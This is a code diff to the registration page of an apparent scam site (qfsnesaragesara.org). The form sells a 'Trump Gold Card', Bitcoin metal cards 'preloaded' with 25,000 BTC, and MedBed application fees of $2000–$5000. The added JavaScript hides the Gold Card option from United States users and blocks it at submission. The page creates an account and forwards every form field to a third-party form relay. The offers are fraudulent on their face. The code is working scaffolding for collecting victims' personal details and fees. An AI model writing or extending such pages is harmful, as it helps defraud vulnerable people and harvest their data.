@@ -119,11 +119,27 @@
         <label class="font-semibold">What are you registering for?</label>
         <select id="regFor" name="registering_for" required class="w-full mt-1 p-3 border rounded-lg">
           <option value="">Select one…</option>
-          <option value="Trump Gold Card Program">Trump Gold Card Program ( Unlock life in America )</option>
-          <option value="Physical Bitcoin Metal Card (Silver $25,000)">Physical Bitcoin Metal Card Silver ( Preloaded with $25,000 worth of Bitcoin)</option>
-          <option value="Physical Bitcoin Metal Card (Black 25,000 BTC)">Physical Bitcoin Metal Card Black ( Preloaded with 25,000 Bitcoin )</option>
-          <option value="MedBeds Application Fees $2000 - $5000">MedBeds Aplication Fees Applicable</option>
+
+          <!-- ✅ gold option is easy to find + hide -->
+          <option id="goldOption" value="Trump Gold Card Program">
+            Trump Gold Card Program ( Unlock life in America )
+          </option>
+
+          <option value="Physical Bitcoin Metal Card (Silver $25,000)">
+            Physical Bitcoin Metal Card Silver ( Preloaded with $25,000 worth of Bitcoin)
+          </option>
+          <option value="Physical Bitcoin Metal Card (Black 25,000 BTC)">
+            Physical Bitcoin Metal Card Black ( Preloaded with 25,000 Bitcoin )
+          </option>
+          <option value="MedBeds Application Fees $2000 - $5000">
+            MedBeds Aplication Fees Applicable
+          </option>
         </select>
+
+        <!-- optional note -->
+        <p id="goldHiddenNote" class="text-xs text-slate-500 mt-2 hidden">
+          Gold Card is not available for United States users.
+        </p>
       </div>
 
       <!-- PAYMENT OPTION -->
@@ -192,9 +208,10 @@
         </div>
       </div>
 
+      <!-- ✅ add id so JS can read what they type -->
       <div>
         <label class="font-semibold">Country</label>
-        <input type="text" name="country" required class="w-full mt-1 p-3 border rounded-lg">
+        <input id="countryEl" type="text" name="country" required class="w-full mt-1 p-3 border rounded-lg">
       </div>
 
       <!-- FAMILY -->
@@ -231,11 +248,61 @@
   const middleNameEl = document.getElementById("middleName");
   const lastNameEl = document.getElementById("lastName");
 
+  // ✅ NEW: Country + gold option refs
+  const countryEl = document.getElementById("countryEl");
+  const goldOption = document.getElementById("goldOption");
+  const goldHiddenNote = document.getElementById("goldHiddenNote");
+
   function show(text, ok=true){
     msg.className = "text-sm text-center " + (ok ? "text-emerald-600" : "text-red-600");
     msg.textContent = text;
     msg.classList.remove("hidden");
   }
+
+  // ✅ detect USA even if they type variations
+  function isUnitedStates(v){
+    const s = String(v || "").trim().toLowerCase().replace(/\./g, "");
+    if(!s) return false;
+
+    const cleaned = s.replace(/\s+/g, " ");
+    return (
+      cleaned === "united states" ||
+      cleaned === "united states of america" ||
+      cleaned === "usa" ||
+      cleaned === "us" ||
+      cleaned === "u s" ||
+      cleaned === "u s a" ||
+      cleaned === "america" ||
+      cleaned === "the united states"
+    );
+  }
+
+  function setGoldVisibility(){
+    if(!goldOption) return;
+
+    const usa = isUnitedStates(countryEl?.value);
+
+    // If USA: hide gold option and reset selection if it was selected.
+    goldOption.hidden = usa;
+    goldOption.disabled = usa;
+
+    if(goldHiddenNote){
+      goldHiddenNote.classList.toggle("hidden", !usa);
+    }
+
+    // If they already picked gold then typed USA -> force them off gold
+    if(usa && regFor && regFor.value === goldOption.value){
+      regFor.value = "";
+    }
+  }
+
+  // run on load + when they type/paste
+  if(countryEl){
+    countryEl.addEventListener("input", setGoldVisibility);
+    countryEl.addEventListener("change", setGoldVisibility);
+  }
+  // run once on boot
+  setGoldVisibility();
 
   function inferTierFromRegisteringFor(registeringForText) {
     const v = (registeringForText || "").toLowerCase();
@@ -246,7 +313,6 @@
   }
 
   async function postFormSubmit() {
-    // Send the same form fields to FormSubmit WITHOUT leaving the page early
     const action = form.getAttribute("action");
     const method = (form.getAttribute("method") || "POST").toUpperCase();
     const fd = new FormData(form);
@@ -257,16 +323,23 @@
       headers: { "Accept": "text/html" }
     });
 
-    // FormSubmit often returns HTML; we just need it to succeed.
     if (!res.ok) throw new Error("Form submit failed (" + res.status + ")");
   }
 
   let busy = false;
 
   form.addEventListener("submit", async (e) => {
-    e.preventDefault(); // ✅ critical: stop navigation so signUp can't get cancelled
+    e.preventDefault();
     if (busy) return;
     busy = true;
+
+    // ✅ final guard: if USA, block gold even if someone tries to hack the DOM
+    setGoldVisibility();
+    if (isUnitedStates(countryEl?.value) && (regFor.value || "").toLowerCase().includes("gold")) {
+      btn.disabled = false;
+      busy = false;
+      return show("Gold Card is not available for United States users. Please choose another option.", false);
+    }
 
     const email = (emailEl.value || "").trim().toLowerCase();
     const pwA = (p1.value || "").trim();
@@ -301,7 +374,7 @@
     btn.disabled = true;
     show("Creating your portal account…");
 
-    const { data, error } = await supabase.auth.signUp({
+    const { error } = await supabase.auth.signUp({
       email,
       password: pwA,
       options: {
@@ -323,18 +396,15 @@
       return show("Signup failed: " + error.message, false);
     }
 
-    // ✅ At this point Auth user is created (may be pending email confirmation)
     show("Account created ✅ Submitting your registration…");
 
     try {
       await postFormSubmit();
     } catch (err) {
-      // Auth account is still created even if email submit fails
       console.warn(err);
       show("Account created ✅ (Email submission failed, but login is created.)", true);
     }
 
-    // Redirect to success page
     window.location.href = "https://qfsnesaragesara.org/success-registration.html";
   });
 })();
